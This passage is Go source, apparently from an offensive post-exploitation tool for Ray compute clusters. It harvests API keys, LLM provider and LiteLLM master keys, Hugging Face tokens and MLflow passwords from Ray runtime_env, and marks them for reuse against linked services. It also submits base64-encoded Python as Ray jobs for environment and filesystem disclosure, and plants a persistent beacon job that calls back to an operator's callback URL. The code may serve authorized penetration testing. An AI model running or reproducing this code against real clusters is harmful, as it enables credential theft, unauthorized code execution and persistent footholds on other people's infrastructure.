	records = append(records, rayCompositeCredentialRecords(rayTarget, envVars, targets)...)
	for name, value := range envVars {
		recType, chainable, targetURL, note := classifyRayEnvCredential(name, value, targets, rayTarget)
		if recType == "" {
			continue
		}
		records = append(records, map[string]interface{}{
			"type":          recType,
			"name":          name,
			"value":         value,
			"source_label":  "ray-runtime-env",
			"source_target": rayTarget,
			"target_url":    targetURL,
			"chainable":     chainable,
			"note":          note,
		})
	}
	sort.Slice(records, func(i, j int) bool {
		left := records[i].(map[string]interface{})["name"].(string)
		right := records[j].(map[string]interface{})["name"].(string)
		return left < right
	})
	return records
}

func rayCompositeCredentialRecords(rayTarget string, envVars map[string]string, targets map[string]string) []interface{} {
	mlflowURL := targets["mlflow"]
	if mlflowURL == "" {
		return nil
	}
	username := firstRayEnvValue(envVars, "MLFLOW_TRACKING_USERNAME", "MLFLOW_USERNAME", "MLFLOW_USER")
	password := firstRayEnvValue(envVars, "MLFLOW_TRACKING_PASSWORD", "MLFLOW_PASSWORD", "MLFLOW_PASS", "MLFLOW_TOKEN")
	if username == "" || password == "" {
		return nil
	}
	encoded := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
	return []interface{}{
		map[string]interface{}{
			"type":          "mlflow-basic-auth",
			"name":          "MLFLOW_BASIC_AUTH",
			"value":         encoded,
			"source_label":  "ray-runtime-env",
			"source_target": rayTarget,
			"target_url":    mlflowURL,
			"chainable":     true,
			"note":          "MLflow Basic Auth credential synthesized from Ray runtime_env username/password",
		},
	}
}

func firstRayEnvValue(envVars map[string]string, names ...string) string {
	for _, wanted := range names {
		for name, value := range envVars {
			if strings.EqualFold(strings.TrimSpace(name), wanted) {
				return strings.TrimSpace(value)
			}
		}
	}
	return ""
}

func rayRuntimeEnvServiceTargets(rayTarget string, envVars map[string]string) map[string]string {
	targets := make(map[string]string)
	for name, value := range envVars {
		key := strings.ToUpper(strings.TrimSpace(name))
		resolved := inferRayLocalServiceURL(rayTarget, value)
		if resolved == "" {
			continue
		}
		switch {
		case strings.Contains(key, "MLFLOW") && (strings.Contains(key, "URI") || strings.Contains(key, "URL")):
			targets["mlflow"] = resolved
		case key == "OPENAI_BASE_URL" || key == "OPENAI_API_BASE" || key == "OPENAI_API_BASE_URL":
			targets["openai"] = resolved
		case strings.Contains(key, "LITELLM") && strings.Contains(key, "URL"):
			targets["litellm"] = resolved
			if targets["openai"] == "" {
				targets["openai"] = resolved
			}
		case key == "WANDB_BASE_URL":
			targets["wandb"] = resolved
		case key == "HF_ENDPOINT" || key == "HUGGINGFACE_HUB_ENDPOINT":
			targets["huggingface"] = resolved
		}
	}
	return targets
}

func classifyRayEnvCredential(name, value string, targets map[string]string, rayTarget string) (typ string, chainable bool, targetURL string, note string) {
	key := strings.ToUpper(strings.TrimSpace(name))
	trimmedValue := strings.TrimSpace(value)
	if trimmedValue == "" {
		return "", false, "", ""
	}
	resolvedURL := inferRayLocalServiceURL(rayTarget, trimmedValue)
	switch {
	case strings.Contains(key, "MLFLOW") && resolvedURL != "":
		return "mlflow-url", true, resolvedURL, "service URL disclosed by Ray runtime_env"
	case (key == "MODEL_REGISTRY_URL" || strings.Contains(key, "MLFLOW")) && resolvedURL != "":
		return "mlflow-url", true, resolvedURL, "service URL disclosed by Ray runtime_env"
	// Name-based match must precede the value-prefix heuristics below: real LiteLLM
	// master keys start with "sk-", which would otherwise be misread as an OpenAI key.
	case strings.Contains(key, "LITELLM") && strings.Contains(key, "MASTER") && strings.Contains(key, "KEY"):
		targetURL = targets["litellm"]
		return "litellm-master-key", targetURL != "", targetURL, "LiteLLM master key exposed in Ray runtime_env"
	case strings.HasPrefix(trimmedValue, "sk-ant-"):
		targetURL = targets["openai"]
		return "anthropic-api-key", targetURL != "", targetURL, "Anthropic-style key exposed in Ray runtime_env"
	case strings.HasPrefix(trimmedValue, "sk-"):
		targetURL = targets["openai"]
		return "openai-api-key", targetURL != "", targetURL, "OpenAI-style key exposed in Ray runtime_env"
	case strings.HasPrefix(trimmedValue, "hf_"):
		targetURL = targets["huggingface"]
		return "hf-token", targetURL != "", targetURL, "HuggingFace token exposed in Ray runtime_env"
	case strings.Contains(key, "WANDB") && strings.Contains(key, "KEY"):
		targetURL = targets["wandb"]
		return "wandb-api-key", targetURL != "", targetURL, "W&B API key exposed in Ray runtime_env"
	case strings.Contains(key, "RAY") && (strings.Contains(key, "TOKEN") || strings.Contains(key, "KEY")):
		return "ray-dashboard-token", true, canonicalServiceURL(rayTarget), "Ray dashboard credential exposed in Ray runtime_env"
	case looksLikeSensitiveEnvKey(key):
		return "secret", false, "", "sensitive runtime_env value; no concrete aipostex follow-on module inferred"
	default:
		return "", false, "", ""
	}
}

func looksLikeSensitiveEnvKey(key string) bool {
	sensitiveTerms := []string{"API_KEY", "_KEY", "TOKEN", "SECRET", "PASSWORD", "PASS", "CREDENTIAL", "DATABASE_URL", "DSN"}
	for _, term := range sensitiveTerms {
		if strings.Contains(key, term) {
			return true
		}
	}
	return false
}

func inferRayLocalServiceURL(rayTarget, raw string) string {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" || !(strings.HasPrefix(trimmed, "http://") || strings.HasPrefix(trimmed, "https://")) {
		return ""
	}
	u, err := url.Parse(trimmed)
	if err != nil || u.Host == "" {
		return ""
	}
	host := strings.ToLower(u.Hostname())
	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
		if rayURL, err := url.Parse(canonicalServiceURL(rayTarget)); err == nil && rayURL.Hostname() != "" {
			port := u.Port()
			u.Host = rayURL.Hostname()
			if port != "" {
				u.Host += ":" + port
			}
		}
	}
	return canonicalServiceURL(u.String())
}

func resolveRayEntrypoint() (string, error) {
	if strings.TrimSpace(rayEntrypoint) != "" {
		return strings.TrimSpace(rayEntrypoint), nil
	}
	switch strings.TrimSpace(rayPayloadPreset) {
	case "", "env-disclosure":
		return "python3 -c 'import os; print(os.getenv(\"AIPOSTEX_PROOF\", \"unset\")); print(os.getenv(\"HOSTNAME\", \"no-host\"))'", nil
	case "env-marked":
		return "python3 -c 'import os; print(os.getenv(\"AIPOSTEX_PROOF\", \"unset\"))'", nil
	case "fs-survey":
		return "python3 -c 'import os; print(\"AIPOSTEX_FS\"); print(os.getcwd()); print(sorted(os.listdir(\".\"))[:10])'", nil
	case "runtime-survey":
		return "python3 -c 'import sys,site; print(\"AIPOSTEX_RUNTIME\"); print(sys.version); print(site.getsitepackages())'", nil
	case "beacon":
		return "python3 -c 'print(\"AIPOSTEX_BEACON\")'", nil
	case "python-print":
		return "python3 -c 'print(\"AIPOSTEX_RAY_PROOF\")'", nil
	default:
		return "", invalidChoiceError("payload-preset", rayPayloadPreset, []string{"env-disclosure", "env-marked", "fs-survey", "runtime-survey", "beacon", "python-print"})
	}
}

func rayPythonEntrypoint(source string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(source))
	return fmt.Sprintf("python3 -c 'import base64; exec(base64.b64decode(%q).decode())'", encoded)
}

// rayBeaconObserveWait bounds how long `ray beacon` polls the submitted job
// for running/terminal status when no out-of-band callback is observed.
var rayBeaconObserveWait = 2 * time.Second

func runRayBeacon(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("ray beacon"); err != nil {
		return err
	}
	if strings.TrimSpace(cfg.CallbackURL) == "" || !isHTTPCallbackURL(cfg.CallbackURL) {
		return fmt.Errorf("--callback-url must be an HTTP(S) URL for beacon (got %q)", cfg.CallbackURL)
	}
	client, _, err := rayClientFactory()
	if err != nil {
		return err
	}

	interval := rayBeaconInterval
	if interval <= 0 {
		interval = 30
	}

	var (
		submission           ray.SubmitResult
		entrypoint           string
		submittedCallbackURL = strings.TrimSpace(cfg.CallbackURL)
	)
	hit, err := confirmOOBCallback(currentContext(), cfg.CallbackURL, oobConfirmWait, func(registerURL string) error {
		submittedCallbackURL = registerURL
		beaconPayload, payloadErr := payloads.Generate("python-beacon", payloads.Params{
			CallbackURL: registerURL,
			Interval:    interval,
		})
		if payloadErr != nil {
			return fmt.Errorf("generating beacon payload: %w", payloadErr)
		}

		entrypoint = rayPythonEntrypoint(beaconPayload)
		runtimeEnv := map[string]interface{}{
			"env_vars": map[string]string{
				"AIPOSTEX_PROOF":  "beacon",
				"CALLBACK_URL":    registerURL,
				"BEACON_INTERVAL": fmt.Sprintf("%d", interval),
			},
		}
		var submitErr error
		submission, submitErr = client.SubmitJob(entrypoint, runtimeEnv)
		return submitErr
	})
	if err != nil {
		return fmt.Errorf("submitting beacon job: %w", err)
	}

	var detail ray.JobDetail
	if strings.TrimSpace(submission.JobID) != "" {
		if hit != nil {
			detail, _ = client.JobDetails(submission.JobID, 128*1024)
		} else {
			detail, _ = client.WaitForJob(submission.JobID, rayBeaconObserveWait, 250*time.Millisecond)
		}
	}
	status := strings.TrimSpace(submission.Status)
	if strings.TrimSpace(detail.Status) != "" {
		status = strings.TrimSpace(detail.Status)
	}
	if status == "" {
		status = "unknown"
	}
	callbackConfirmed := hit != nil
	running := strings.EqualFold(status, "RUNNING")
	confirmed := callbackConfirmed || running

	severity := report.SeverityHigh
	stage := "impact"
	landed := "influenced"
	title := fmt.Sprintf("Ray beacon job accepted: %s", safeLabel(submission.JobID))
	description := fmt.Sprintf("Ray accepted beacon job %s (status=%s), but no callback or running-job status was confirmed within %s.", safeLabel(submission.JobID), safeLabel(status), rayBeaconObserveWait)
	signal := "submission-accepted"
	if callbackConfirmed {
		severity = report.SeverityCritical
		stage = "own"
		landed = "execution-confirmed"
		title = fmt.Sprintf("Ray persistence beacon confirmed: %s", safeLabel(submission.JobID))
		description = fmt.Sprintf("Ray scheduled the long-running beacon job %s and an inbound callback was observed from the worker — persistent execution is confirmed.", safeLabel(submission.JobID))
		signal = "callback-confirmed"
	} else if running {
		severity = report.SeverityCritical
		stage = "own"
		landed = "execution-confirmed"
		title = fmt.Sprintf("Ray persistence job running: %s", safeLabel(submission.JobID))
		description = fmt.Sprintf("Ray accepted beacon job %s and the Jobs API reports it RUNNING, confirming the long-running worker foothold is scheduled.", safeLabel(submission.JobID))
		signal = "job-running"
	}

	finding := newExploitFinding(
		report.SourceRay,
		rayTarget,
		title,
		severity,
		description,
		map[string]interface{}{
			"module":                 "ray",
			"action":                 "beacon",
			"mutating":               true,
			"provider":               "ray",
			"job_id":                 submission.JobID,
			"status":                 status,
			"callback_url":           cfg.CallbackURL,
			"submitted_callback_url": submittedCallbackURL,
			"callback_confirmed":     callbackConfirmed,
			"running":                running,
			"confirmed":              confirmed,
			"beacon_signal":          signal,
			"interval":               interval,
		},
	)
	if callbackConfirmed {
		finding.Metadata["callback_remote_addr"] = hit.RemoteAddr
		finding.Metadata["callback_body"] = hit.Body
	}
	finding.Evidence = fmt.Sprintf("submission_id=%s\nstatus=%s\ncallback_url=%s\nsubmitted_callback_url=%s\ninterval=%ds\nsignal=%s",
		submission.JobID, status, cfg.CallbackURL, submittedCallbackURL, interval, signal)
	if callbackConfirmed {
		finding.Evidence += fmt.Sprintf("\ncallback_remote_addr=%s\ncallback_body=%s", hit.RemoteAddr, hit.Body)
	}
	if strings.TrimSpace(detail.Logs) != "" {
		finding.Evidence += "\nlogs:\n" + strings.TrimSpace(detail.Logs)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "ray-beacon", "beacon-submit")
	beaconPlan := buildRayBeaconWorkflowPlan(rayTarget, submission.JobID, stage, landed)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, beaconPlan)

	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "ray",
		Action:              "beacon",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{beaconPlan},
	})
}
